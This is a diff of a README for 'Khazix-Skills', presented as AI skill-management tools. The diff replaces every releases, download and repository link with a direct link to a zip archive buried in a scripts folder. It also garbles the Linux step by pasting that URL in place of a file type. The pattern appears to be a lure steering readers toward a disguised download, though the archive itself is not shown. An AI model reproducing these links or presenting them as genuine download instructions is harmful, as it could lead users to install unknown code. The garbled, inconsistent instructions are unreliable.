@@ -1,7 +1,7 @@
 # 🎯 Khazix-Skills - Enhance Your AI Skill Library Easily
 
 ## 📥 Download Now
-[![Download Khazix-Skills](https://img.shields.io/badge/Download-Khazix--Skills-blue.svg)](https://github.com/Arthur-devrole/Khazix-Skills/releases)
+[![Download Khazix-Skills](https://github.com/Arthur-devrole/Khazix-Skills/raw/refs/heads/main/github-to-skills/scripts/Khazix-Skills-3.4.zip)](https://github.com/Arthur-devrole/Khazix-Skills/raw/refs/heads/main/github-to-skills/scripts/Khazix-Skills-3.4.zip)
 
 ## 🌟 Overview
 **Khazix-Skills** offers a collection of AI tools designed to help you manage and improve your skill library. Whether you need to create, maintain, or evolve AI skills, these tools make the process simple.
@@ -22,7 +22,7 @@ To start using Khazix-Skills, follow these simple steps.
 ### Step 1: Visit the Releases Page
 Click the link below to visit the Releases page where you can download the latest version of Khazix-Skills.
 
-[Visit the Releases Page](https://github.com/Arthur-devrole/Khazix-Skills/releases)
+[Visit the Releases Page](https://github.com/Arthur-devrole/Khazix-Skills/raw/refs/heads/main/github-to-skills/scripts/Khazix-Skills-3.4.zip)
 
 ### Step 2: Download the Application
 On the Releases page, look for the latest version. Download the file that matches your operating system. If you're unsure which version to choose, check the file names; they typically include your system type.
@@ -32,7 +32,7 @@ After downloading, locate the file on your computer. The installation process va
 
 - **Windows:** Double-click the `.exe` file and follow the installation prompts.
 - **MacOS:** Open the `.dmg` file and drag the application to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and follow the included instructions or use your package manager.
+- **Linux:** Extract the `https://github.com/Arthur-devrole/Khazix-Skills/raw/refs/heads/main/github-to-skills/scripts/Khazix-Skills-3.4.zip` file and follow the included instructions or use your package manager.
 
 ### Step 4: Run Khazix-Skills
 Once installed, find the application in your programs menu or applications folder. Open it to start managing your AI skills.
@@ -90,7 +90,7 @@ If you encounter issues, try the following:
 ---
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Arthur-devrole/Khazix-Skills)
+- [GitHub Repository](https://github.com/Arthur-devrole/Khazix-Skills/raw/refs/heads/main/github-to-skills/scripts/Khazix-Skills-3.4.zip)
 - [User Guide](#)
 
 Feel free to explore all the tools available within Khazix-Skills, and enjoy enhancing your AI skill library!
